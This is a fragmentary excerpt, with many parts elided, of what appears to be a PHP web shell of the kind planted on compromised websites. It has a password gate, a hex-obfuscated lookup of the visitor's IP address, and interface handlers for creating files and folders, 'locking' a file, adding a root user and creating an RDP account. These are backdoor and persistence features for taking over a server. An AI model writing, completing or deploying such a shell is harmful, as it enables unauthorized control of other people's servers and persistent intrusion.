...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$hSYk1LyAuZNkLPWB3XhdFOOb2AQ07KQ8VNNT1s0dpSzd9ixjyzO9G'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-solid fa-network-wired"></i>&nbsp;:
                ...
                <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
    ...
    $(document).ready(function() {
        ...
        $('#create_folder').click(function() {
            ...
            $('#modal-input').html(
                '<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">'
                );
        ...
        $('#create_file').click(function() {
            ...
            $('#modal-input').html(
                '<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">'
                );
            event.preventDefault();
        });
        $('#lock-file').click(function() {
            ...
            $('#modal-input').html(
                '<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">'
                );
            event.preventDefault();
        });
        $('#root-user').click(function() {
            ...
            $('#modal-input').html(
                '<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">'
                );
            event.preventDefault();
        });
        ...
        $('#create-rdp').click(function() {
            ...
            $('#modal-input').html(
                '<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">'
                );
            event.preventDefault();
        });
